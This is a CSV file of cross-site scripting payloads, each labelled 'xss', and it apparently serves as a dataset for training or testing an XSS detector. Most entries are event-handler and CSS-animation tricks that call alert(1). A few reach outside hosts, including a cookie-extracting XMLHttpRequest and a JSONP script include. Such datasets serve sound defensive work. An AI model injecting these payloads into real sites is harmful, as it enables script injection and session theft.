Payloads,Types
"<select onbeforecut=""alert(1)"" contenteditable>test</select>",xss
"<th oncontextmenu=""alert(1)"">test</th>",xss
</script> %>/,xss
<textarea autofocus onfocusin=alert(1)>test</textarea>,xss
"<body onBeforeUnload body onBeforeUnload=""javascript:javascript:alert(1)""></body onBeforeUnload>",xss
<rp onpointermove=alert(1)>XSS</rp>,xss
"<div draggable=""true"" ondrag=""alert(1)"">test</div>",xss
"<style>:target {color:red;}</style><head id=x style=""transition:color 1s"" ontransitionend=alert(1)></head>",xss
"<TABLE BACKGROUND=""javascript:javascript:alert(1)"">",xss
"<template onclick=""alert(1)"">test</template>",xss
onCut,xss
"<style>@keyframes x{}</style><area style=""animation-name:x"" onanimationstart=""alert(1)""></area>",xss
"<blink onpaste=""alert(1)"" contenteditable>test</blink>",xss
<html onpointerleave=alert(1)>XSS</html>,xss
"<listing oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",xss
"<hr draggable=""true"" ondragend=""alert(1)"">test</hr>",xss
"<output onmousedown=""alert(1)"">test</output>",xss
"<style>@keyframes x{}</style><mark style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></mark>",xss
<aside id=x tabindex=1 onfocus=alert(1)></aside>,xss
<iframe2 id=x tabindex=1 onactivate=alert(1)></iframe2>,xss
"`""'><img src=xxx:x \x00onerror=javascript:alert(1)>",xss
"<style>:target {color:red;}</style><ol id=x style=""transition:color 1s"" ontransitionend=alert(1)></ol>",xss
onmouseup,xss
"<nextid onmousemove=""alert(1)"">test</nextid>",xss
<label onfocusout=alert(1) tabindex=1 id=x></label><input autofocus>,xss
"<title onPropertyChange title onPropertyChange=""javascript:javascript:alert(1)""></title onPropertyChange>",xss
"<q onkeypress=""alert(1)"" contenteditable>test</q>",xss
<noembed id=x tabindex=1 onfocusin=alert(1)></noembed>,xss
"<label onclick=""alert(1)"">test</label>",xss
"<style>:target {color:red;}</style><tt id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></tt>",xss
<keygen id=x onfocusin=alert(1)>,xss
"<menu onmouseenter=""alert(1)"">test</menu>",xss
"<template onmouseover=""alert(1)"">test</template>",xss
&#x0003C,xss
"<div id=""117""><a href=""http://attacker.org"">",xss
"<style>@keyframes x{}</style><optgroup style=""animation-name:x"" onanimationend=""alert(1)""></optgroup>",xss
<button onpointerover=alert(1)>XSS</button>,xss
onTimeError,xss
"<main draggable=""true"" ondragend=""alert(1)"">test</main>",xss
"<canvas ondblclick=""alert(1)"" autofocus tabindex=1>test</canvas>",xss
\u003c,xss
"""><script+src=""https://m.addthis.com/live/red_lojson/100eng.json?callback=alert(1337)""></script>",xss
"ABC<div style=""x:\xE2\x80\x86expression(javascript:alert(1)"">DEF",xss
"<del onmouseenter=""alert(1)"">test</del>",xss
<dialog id=x tabindex=1 onbeforeactivate=alert(1)></dialog>,xss
<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X,xss
"<STYLE TYPE=""text/javascript"">javascript:alert(1);</STYLE>",xss
"<style onmouseover=""alert(1)"">test</style>",xss
"<style>@keyframes x{}</style><custom tags style=""animation-name:x"" onanimationend=""alert(1)""></custom tags>",xss
<link onblur=alert(1) tabindex=1 id=x></link><input autofocus>,xss
<iframe onpointerdown=alert(1)>XSS</iframe>,xss
"<div draggable=""true"" contenteditable>drag me</div><animatemotion ondrop=alert(1) contenteditable>drop here</animatemotion>",xss
"<style>@keyframes x{}</style><figure style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></figure>",xss
"<colgroup oncontextmenu=""alert(1)"">test</colgroup>",xss
"<image2 draggable=""true"" ondragstart=""alert(1)"">test</image2>",xss
"<mark onkeydown=""alert(1)"" contenteditable>test</mark>",xss
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>,xss
<p id=x tabindex=1 onfocus=alert(1)></p>,xss
"<applet onmousedown=""alert(1)"">test</applet>",xss
"<dl onkeydown=""alert(1)"" contenteditable>test</dl>",xss
"<figcaption draggable=""true"" ondrag=""alert(1)"">test</figcaption>",xss
"<img onmouseup=""alert(1)"">test</img>",xss
"<title onmouseup=""alert(1)"">test</title>",xss
"<input oncontextmenu=""alert(1)"">test</input>",xss
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,xss
<label id=x tabindex=1 onfocusin=alert(1)></label>,xss
<base onpointerenter=alert(1)>XSS</base>,xss
<dir onpointerrawupdate=alert(1)>XSS</dir>,xss
"<svg onLoad svg onLoad=""javascript:javascript:alert(1)""></svg onLoad>",xss
"<xmp draggable=""true"" ondragleave=""alert(1)"">test</xmp>",xss
<hgroup onpointermove=alert(1)>XSS</hgroup>,xss
"<address oncontextmenu=""alert(1)"">test</address>",xss
<figcaption onpointerrawupdate=alert(1)>XSS</figcaption>,xss
<col id=x tabindex=1 ondeactivate=alert(1)></col><input id=y autofocus>,xss
"<style>:target {color:red;}</style><image3 id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></image3>",xss
"<div draggable=""true"" contenteditable>drag me</div><bdo ondrop=alert(1) contenteditable>drop here</bdo>",xss
<mark onpointerenter=alert(1)>XSS</mark>,xss
<b id=x tabindex=1 onbeforedeactivate=alert(1)></b><input autofocus>,xss
"<button onmouseleave=""alert(1)"">test</button>",xss
"<datalist onkeyup=""alert(1)"" contenteditable>test</datalist>",xss
<script>/* *\x2A/javascript:alert(1)// */</script>,xss
onkeyup,xss
"<small onkeydown=""alert(1)"" contenteditable>test</small>",xss
"<style>@keyframes x{}</style><big style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></big>",xss
<template id=x tabindex=1 ondeactivate=alert(1)></template><input id=y autofocus>,xss
"<set attributeName=""xlink:href"" begin=""accessKey(d)"" to=""//example.com/?d"" />",xss
"<style>:target {color:red;}</style><tbody id=x style=""transition:color 1s"" ontransitionstart=alert(1)></tbody>",xss
"<marquee onkeypress=""alert(1)"" contenteditable>test</marquee>",xss
ondragleave,xss
"<menu onmousemove=""alert(1)"">test</menu>",xss
<audio controls src=1 onfocus=alert(1) autofocus>,xss
"<style>:target {color:red;}</style><head id=x style=""transition:color 1s"" ontransitionstart=alert(1)></head>",xss
<tt onpointerrawupdate=alert(1)>XSS</tt>,xss
onmouseenter,xss
<dt onbeforescriptexecute=alert(1)><script>1</script>,xss
"<form onbeforecut=""alert(1)"" contenteditable>test</form>",xss
"<output onbeforepaste=""alert(1)"" contenteditable>test</output>",xss
"<track onmousedown=""alert(1)"">test</track>",xss
"<aside onmouseup=""alert(1)"">test</aside>",xss
<input id=x onfocus=alert(1)>,xss
<menu onpointermove=alert(1)>XSS</menu>,xss
"@font-face {font-family: y; src: url(""font.svg#x"") format(""svg"");} body {font: 100px ""y"";}",xss
"<thead draggable=""true"" ondragend=""alert(1)"">test</thead>",xss
"<div draggable=""true"" contenteditable>drag me</div><html ondrop=alert(1) contenteditable>drop here</html>",xss
"<pre onkeypress=""alert(1)"" contenteditable>test</pre>",xss
<element onpointerover=alert(1)>XSS</element>,xss
<fieldset onpointerenter=alert(1)>XSS</fieldset>,xss
"<style draggable=""true"" ondragleave=""alert(1)"">test</style>",xss
<optgroup id=x tabindex=1 onbeforeactivate=alert(1)></optgroup>,xss
<textarea onpointerover=alert(1)>XSS</textarea>,xss
<h1 id=x tabindex=1 ondeactivate=alert(1)></h1><input id=y autofocus>,xss
"<style>@keyframes x{}</style><a style=""animation-name:x"" onanimationstart=""alert(1)""></a>",xss
<footer id=x tabindex=1 onfocusin=alert(1)></footer>,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ins id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></ins>",xss
<var id=x tabindex=1 onactivate=alert(1)></var>,xss
"<track onmouseenter=""alert(1)"">test</track>",xss
<noframes onblur=alert(1) tabindex=1 id=x></noframes><input autofocus>,xss
<script onmousewheel=alert(1)>requires scrolling,xss
"<script src=""data:\xE0\xA4\x98,javascript:alert(1)""></script>",xss
<img onpointerleave=alert(1)>XSS</img>,xss
"<style>@keyframes x{}</style><content style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></content>",xss
<script>parent['alert'](1)</script>,xss
<center onmousewheel=alert(1)>requires scrolling,xss
<head>,xss
"<figure onkeydown=""alert(1)"" contenteditable>test</figure>",xss
"<legend draggable=""true"" ondragleave=""alert(1)"">test</legend>",xss
"<style>@keyframes x{}</style><dl style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></dl>",xss
"<u onbeforecopy=""alert(1)"" contenteditable>test</u>",xss
"<ins draggable=""true"" ondragenter=""alert(1)"">test</ins>",xss
"<style>@keyframes slidein {}</style><xmp style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></xmp>",xss
<dl onfocusout=alert(1) tabindex=1 id=x></dl><input autofocus>,xss
<cite onpointerout=alert(1)>XSS</cite>,xss
"<footer onmouseenter=""alert(1)"">test</footer>",xss
<frame onpointerup=alert(1)>XSS</frame>,xss
"<body oncontextmenu=""alert(1)"">test</body>",xss
"<bgsound onmouseup=""alert(1)"">test</bgsound>",xss
<menuitem onpointermove=alert(1)>XSS</menuitem>,xss
<th onfocusout=alert(1) tabindex=1 id=x></th><input autofocus>,xss
"<mark oncut=alert(1) value=""XSS"" autofocus tabindex=1>test",xss
"<style>:target {transform: rotate(180deg);}</style><area id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></area>",xss
<iframe id=x tabindex=1 onbeforedeactivate=alert(1)></iframe><input autofocus>,xss
"<select onbeforecopy=""alert(1)"" contenteditable>test</select>",xss
"<noscript oncontextmenu=""alert(1)"">test</noscript>",xss
"<progress onbeforecut=""alert(1)"" contenteditable>test</progress>",xss
<q onpointerenter=alert(1)>XSS</q>,xss
<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>,xss
"<style>:target {transform: rotate(180deg);}</style><figure id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></figure>",xss
"<code onbeforepaste=""alert(1)"" contenteditable>test</code>",xss
<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>,xss
<article onpointermove=alert(1)>XSS</article>,xss
<animatemotion onpointerleave=alert(1)>XSS</animatemotion>,xss
<img alt='%></xmp><img src=xx:x onerror=alert(134)//'>,xss
[C],xss
"<style>@keyframes slidein {}</style><main style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></main>",xss
"<style>@keyframes x{}</style><ul style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></ul>",xss
"<style>@keyframes slidein {}</style><ul style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ul>",xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><u id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></u>",xss
"""`'><script>\xE2\x80\x81javascript:alert(1)</script>",xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><area id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></area>",xss
"<dialog draggable=""true"" ondragstart=""alert(1)"">test</dialog>",xss
"<style>:target {color: red;}</style><legend id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></legend>",xss
"<div draggable=""true"" contenteditable>drag me</div><font ondrop=alert(1) contenteditable>drop here</font>",xss
"<div draggable=""true"" contenteditable>drag me</div><ol ondragover=alert(1) contenteditable>drop here</ol>",xss
<q onpointermove=alert(1)>XSS</q>,xss
"<caption onmousemove=""alert(1)"">test</caption>",xss
"<section onmouseover=""alert(1)"">test</section>",xss
"<blockquote onmouseup=""alert(1)"">test</blockquote>",xss
<body onhashchange=alert(1)><a href=#x>click this!#x,xss
"<style>:target {color: red;}</style><label id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></label>",xss
"<div draggable=""true"" contenteditable>drag me</div><font ondragover=alert(1) contenteditable>drop here</font>",xss
"<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",xss
<summary onpointerrawupdate=alert(1)>XSS</summary>,xss
<small onpointerdown=alert(1)>XSS</small>,xss
"<s onmouseenter=""alert(1)"">test</s>",xss
"<meta oncontextmenu=""alert(1)"">test</meta>",xss
<body onorientationchange=alert(1)>,xss
"<abbr onbeforecut=""alert(1)"" contenteditable>test</abbr>",xss
"<thead oncontextmenu=""alert(1)"">test</thead>",xss
"<style>@keyframes x{}</style><meta style=""animation-name:x"" onanimationstart=""alert(1)""></meta>",xss
"""><img src=x onerror=prompt(1);>",xss
"<frame onpaste=""alert(1)"" contenteditable>test</frame>",xss
<center onpointerenter=alert(1)>XSS</center>,xss
"<tr onbeforecut=""alert(1)"" contenteditable>test</tr>",xss
<image3 id=x tabindex=1 ondeactivate=alert(1)></image3><input id=y autofocus>,xss
"<keygen onbeforecopy=""alert(1)"" contenteditable>test</keygen>",xss
"<animatemotion oncut=alert(1) value=""XSS"" autofocus tabindex=1>test",xss
"<datalist onkeypress=""alert(1)"" contenteditable>test</datalist>",xss
"<style>@keyframes slidein {}</style><head style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></head>",xss
"<A HREF=""http://0102.0146.0007.00000223/"">XSS</A>",xss
"<area onkeydown=""alert(1)"" contenteditable>test</area>",xss
"<style></style\x0D<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
"<select onkeyup=""alert(1)"" contenteditable>test</select>",xss
&#x3C;,xss
